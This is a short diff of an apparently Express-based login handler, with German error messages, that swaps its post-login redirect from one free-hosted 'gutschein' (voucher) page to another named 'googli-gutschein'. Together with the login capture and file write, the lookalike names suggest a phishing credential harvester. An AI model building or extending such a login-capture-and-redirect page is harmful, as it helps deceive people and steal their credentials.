@@ -52,7 +52,7 @@ app.post("/login", (req, res) => {
       console.error("Fehler beim Schreiben:", err);
       return res.status(500).send("Serverfehler");
     }
-    res.redirect("https://webly-gutschein.weebly.com/end.html");
+    res.redirect("https://sites.google.com/view/googli-gutschein/end");
   });
 });
 
